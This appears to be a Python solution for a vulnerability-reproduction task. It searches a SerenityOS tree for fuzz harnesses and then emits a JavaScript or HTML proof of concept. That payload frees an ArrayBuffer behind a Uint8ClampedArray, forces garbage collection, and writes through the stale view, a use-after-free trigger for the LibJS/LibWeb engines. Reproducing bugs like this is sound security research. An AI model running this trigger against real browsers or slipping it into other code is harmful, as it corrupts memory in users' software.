import os
import re
import tarfile
from typing import Iterable, Optional, Tuple


class Solution:
    def solve(self, src_path: str) -> bytes:
        kind = self._detect_input_kind(src_path)
        js = self._js_core()
        if kind == "html":
            return self._wrap_html(js)
        return js.encode("utf-8", "strict")

    @staticmethod
    def _js_core() -> str:
        return (
            "(function(){\n"
            "function force_gc(){\n"
            "  try{if(typeof gc==='function'){for(var i=0;i<20;i++)gc();return;}}catch(e){}\n"
            "  for(var r=0;r<3;r++){\n"
            "    var junk=[];\n"
            "    for(var i=0;i<64;i++)junk.push(new ArrayBuffer(1<<18));\n"
            "    for(var j=0;j<20000;j++)junk.push({a:j,b:j});\n"
            "    junk=null;\n"
            "  }\n"
            "}\n"
            "var ab=new ArrayBuffer(0x1000);\n"
            "var u=new Uint8ClampedArray(ab);\n"
            "ab=null;\n"
            "force_gc();\n"
            "for(var k=0;k<200000;k++)u[k&4095]=k;\n"
            "var z=u[0];\n"
            "if(typeof print==='function')print(z);\n"
            "})();\n"
        )

    @staticmethod
    def _wrap_html(js: str) -> bytes:
        html = (
            "<!doctype html><meta charset=utf-8>"
            "<title>poc</title>"
            "<script>\n" + js + "\n</script>"
        )
        return html.encode("utf-8", "strict")

    def _detect_input_kind(self, src_path: str) -> str:
        best = self._find_best_harness_text(src_path)
        if best is None:
            if self._looks_like_serenity_tree(src_path):
                return "html"
            return "js"
        kind = self._infer_kind_from_harness(best)
        return kind or "html"

    @staticmethod
    def _looks_like_serenity_tree(src_path: str) -> bool:
        if os.path.isdir(src_path):
            for p in (
                ("Userland", "Libraries", "LibWeb"),
                ("Userland", "Libraries", "LibJS"),
                ("Meta", "Lagom"),
            ):
                if os.path.exists(os.path.join(src_path, *p)):
                    return True
            return False
        # For tarballs, we can't cheaply check without opening; caller already tried.
        return True

    def _find_best_harness_text(self, src_path: str) -> Optional[str]:
        best_score = -1
        best_text = None

        def consider_text(name: str, text: str) -> None:
            nonlocal best_score, best_text
            if "LLVMFuzzerTestOneInput" not in text and not re.search(r"\bfuzz", name, re.IGNORECASE):
                return

            score = 0
            lowered = text.lower()
            name_l = name.lower()

            # Relevance to vulnerability
            if "uint8clampedarray" in lowered:
                score += 30
            if "typedarray" in lowered:
                score += 10
            if "arraybuffer" in lowered:
                score += 6
            if "imagedata" in lowered:
                score += 12
            if "canvas" in lowered:
                score += 6

            # Input-type hints
            if "libweb" in lowered or "/libweb/" in name_l or "web::" in text:
                score += 8
            if "html" in lowered or "dom" in lowered or "webcontent" in lowered:
                score += 6
            if "libjs" in lowered or "/libjs/" in name_l or "js::" in text:
                score += 6

            if score > best_score:
                best_score = score
                best_text = text

        if os.path.isdir(src_path):
            for path in self._iter_candidate_source_files_dir(src_path):
                try:
                    with open(path, "rb") as f:
                        data = f.read(400_000)
                    text = data.decode("utf-8", "ignore")
                except Exception:
                    continue
                consider_text(os.path.relpath(path, src_path), text)
            return best_text

        try:
            with tarfile.open(src_path, "r:*") as tf:
                members = tf.getmembers()
                candidates = [m for m in members if self._is_candidate_source_member(m)]
                # Prefer likely harnesses
                candidates.sort(key=lambda m: (0 if re.search(r"fuzz|harness", m.name, re.IGNORECASE) else 1, m.size))
                for m in candidates[:120]:
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read(400_000)
                        text = data.decode("utf-8", "ignore")
                    except Exception:
                        continue
                    consider_text(m.name, text)
        except Exception:
            return None

        return best_text

    @staticmethod
    def _is_candidate_source_member(m: tarfile.TarInfo) -> bool:
        if not m.isfile():
            return False
        n = m.name.lower()
        if not n.endswith((".cpp", ".cc", ".cxx", ".c", ".h", ".hpp")):
            return False
        if m.size <= 0 or m.size > 800_000:
            return False
        # Ignore huge vendored or generated blobs
        if any(x in n for x in ("/thirdparty/", "/build/", "/generated/", "/out/")):
            return False
        return True

    @staticmethod
    def _iter_candidate_source_files_dir(root: str) -> Iterable[str]:
        for dirpath, dirnames, filenames in os.walk(root):
            dp_l = dirpath.lower()
            if any(x in dp_l for x in (os.sep + "thirdparty" + os.sep, os.sep + "build" + os.sep, os.sep + "out" + os.sep)):
                continue
            for fn in filenames:
                fn_l = fn.lower()
                if not fn_l.endswith((".cpp", ".cc", ".cxx", ".c", ".h", ".hpp")):
                    continue
                p = os.path.join(dirpath, fn)
                try:
                    if os.path.getsize(p) > 800_000:
                        continue
                except OSError:
                    continue
                yield p

    @staticmethod
    def _infer_kind_from_harness(text: str) -> Optional[str]:
        t = text
        tl = text.lower()

        html_score = 0
        js_score = 0

        if "libweb" in tl or "web::" in t or "webcontent" in tl:
            html_score += 4
        if re.search(r"\bhtml\b", tl) or "dom::" in tl or "document" in tl:
            html_score += 3
        if "htmlparser" in tl or "parse_html" in tl or "html::parser" in tl:
            html_score += 8
        if "loadrequest" in tl or "resource_loader" in tl or "page_client" in tl:
            html_score += 5

        if "libjs" in tl or "js::" in t:
            js_score += 4
        if "js::parser" in tl or "parse_program" in tl or "bytecode" in tl or "interpreter" in tl:
            js_score += 7
        if "run(" in tl and "script" in tl:
            js_score += 2

        if html_score == 0 and js_score == 0:
            # Heuristic based on vulnerability context
            if "imagedata" in tl or "canvas" in tl:
                return "html"
            if "uint8clampedarray" in tl or "typedarray" in tl:
                return "js"
            return None

        return "html" if html_score >= js_score else "js"